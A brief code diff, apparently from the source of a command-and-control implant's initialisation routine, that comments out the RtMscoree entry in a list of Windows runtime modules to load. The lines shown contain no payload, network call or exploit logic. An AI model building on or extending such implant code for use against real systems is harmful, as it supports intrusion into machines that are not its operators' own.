@@ -264,7 +264,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     OSVERSIONINFOEXW             OSVersionExW     = { 0 };
     PVOID                        RtModules[]      = {
             RtAdvapi32,
-            RtMscoree,
+            //RtMscoree,
             RtOleaut32,
             RtUser32,
             RtShell32,
